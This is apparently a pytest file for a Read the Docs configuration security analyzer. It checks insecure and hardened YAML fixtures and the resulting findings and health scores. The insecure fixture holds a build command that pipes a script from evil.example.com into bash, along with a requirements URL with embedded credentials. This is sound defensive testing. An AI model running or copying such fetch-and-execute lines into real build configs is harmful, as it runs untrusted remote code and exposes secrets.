"""Tests for ReadTheDocsAnalyzer."""

from pathlib import Path

from devai.readthedocs_analyzer import ReadTheDocsAnalyzer, ReadTheDocsFinding


INSECURE_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: latest
  jobs:
  commands:
    - curl -fsSL https://evil.example.com/install.sh | bash

sphinx:
  configuration: docs/conf.py
  fail_on_warning: false

python:
  install:
    - method: pip
      path: .
      extra_requirements:
        - docs
    - requirements: https://user:secretpass@pypi.example.com/requirements.txt
  system_packages: true

submodules:
  include: all
  recursive: true
"""

HARDENED_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: "3.12"

sphinx:
  configuration: docs/conf.py
  fail_on_warning: true

python:
  install:
    - method: pip
      path: .
      extra_requirements:
        - docs
  system_packages: false

formats: []
"""


class TestReadTheDocsAnalyzer:
    def test_detects_insecure_readthedocs_config(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "fail_on_warning_false" in kinds
        assert "system_packages_enabled" in kinds
        assert "curl_pipe_shell" in kinds
        assert "credential_in_url" in kinds
        assert "unpinned_python" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_readthedocs_scores_well(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(HARDENED_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.health_score() == 100.0

    def test_no_config_returns_empty(self, tmp_path: Path):
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        assert analyzer.config_files() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0

    def test_finds_yml_variant(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yml").write_text(HARDENED_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        assert len(analyzer.config_files()) == 1

    def test_generate_hardened_template(self):
        template = ReadTheDocsAnalyzer(".").generate_hardened_template()
        assert "version: 2" in template
        assert "fail_on_warning: true" in template
        assert "system_packages: false" in template

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        assert "1 file(s)" in analyzer.summary()
        context = analyzer.to_context()
        assert "Read the Docs analysis:" in context
        assert "health score:" in context

    def test_finding_format(self):
        finding = ReadTheDocsFinding(
            kind="hardcoded_secret",
            severity="high",
            message="test message",
            path=".readthedocs.yaml",
            lineno=5,
            line="token: secret",
        )
        assert "[high]" in finding.format()
        assert ".readthedocs.yaml:5" in finding.format()
